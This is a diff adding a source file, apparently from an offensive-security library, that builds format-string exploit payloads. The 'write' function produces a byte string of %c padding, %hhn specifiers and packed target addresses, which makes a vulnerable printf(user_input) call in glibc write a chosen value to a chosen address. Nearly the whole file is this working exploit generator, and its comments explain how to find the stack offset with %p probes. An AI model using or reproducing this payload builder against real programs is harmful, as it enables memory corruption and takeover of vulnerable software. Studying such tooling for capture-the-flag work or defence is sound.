@@ -1,0 +1,97 @@
+# offsec.fmt: build a format-string exploit payload for an arbitrary write.
+#
+#     const p: vector[u8] = fmt.write(0x404040, 0xdeadbeef, 6, Width.Bits64)
+#
+# When a program calls `printf(user_input)` on your bytes, `%n`-family specifiers write the
+# number of characters printed so far to an address taken from the stack. `write` turns that into
+# a chosen `value` at a chosen `target`: it writes one byte at a time with `%hhn`, padding the
+# count with `%c`, and places the addresses after the specifiers. `offset` is the stack argument
+# index where your payload begins (find it with `%p` probes). It targets glibc printf; 64-bit
+# uses 8-byte addresses, 32-bit 4-byte. The written bytes are ordered low value first so the
+# count only ever grows.
+
+from binary import Width
+
+priv manual fn align_up(n: size, a: size) -> size:
+    const r: size = n % a
+    if r == 0:
+        return n
+    return n + (a - r)
+
+# The specifier run: for each target byte (already sorted ascending), a `%<delta>c` to advance
+# the count and a `%<pos>$hhn` to write the low byte at the matching address slot.
+priv manual fn build_spec(bytes: &vector[i64], offset: size, slots: size, width: size) -> str:
+    mut running: i64 = 0
+    mut s: str = ""
+    mut j: size = 0
+    while j < width:
+        mut delta: i64 = bytes[j] - running
+        if delta < 0:
+            delta += 256
+        if delta > 0:
+            s += f"%{delta}c"
+        const pos: size = offset + slots + j
+        s += f"%{pos}$hhn"
+        running = bytes[j]
+        j += 1
+    return s
+
+# A payload that makes `printf` write `value` to `target`. `offset` is the argument index where
+# the payload starts on the stack; `bits` is the target's class.
+manual fn write(target: u64, value: u64, offset: size, bits: Width) -> vector[u8]:
+    mut slot: size = 8
+    if bits == Width.Bits32:
+        slot = 4
+    const width: size = slot
+    mut bytes: vector[i64] = []
+    mut addrs: vector[u64] = []
+    mut i: size = 0
+    while i < width:
+        bytes.push(i64((value >> u64(8 * i)) & u64(255)))
+        addrs.push(target + u64(i))
+        i += 1
+    # sort (byte, address) pairs by byte value ascending
+    mut a: size = 0
+    while a < width:
+        mut m: size = a
+        mut b: size = a + 1
+        while b < width:
+            if bytes[b] < bytes[m]:
+                m = b
+            b += 1
+        if m != a:
+            const tb: i64 = bytes[a]
+            bytes[a] = bytes[m]
+            bytes[m] = tb
+            const ta: u64 = addrs[a]
+            addrs[a] = addrs[m]
+            addrs[m] = ta
+        a += 1
+    # the specifier run grows the address block's start; settle it to a fixpoint
+    mut slots: size = 1
+    mut spec: str = ""
+    mut tries: size = 0
+    while tries < 8:
+        spec = build_spec(&bytes, offset, slots, width)
+        const got: size = align_up(byte_len(spec), slot) // slot
+        if got == slots:
+            tries = 8
+        else:
+            slots = got
+            tries += 1
+    # assemble: specifiers, padding to a slot boundary, then the addresses
+    mut out: vector[u8] = []
+    mut k: size = 0
+    while k < byte_len(spec):
+        out.push(spec.byte(k))
+        k += 1
+    while len(out) % slot != 0:
+        out.push(u8(0x41))
+    mut j: size = 0
+    while j < width:
+        mut w: size = 0
+        while w < slot:
+            out.push(u8((addrs[j] >> u64(8 * w)) & u64(255)))
+            w += 1
+        j += 1
+    return out
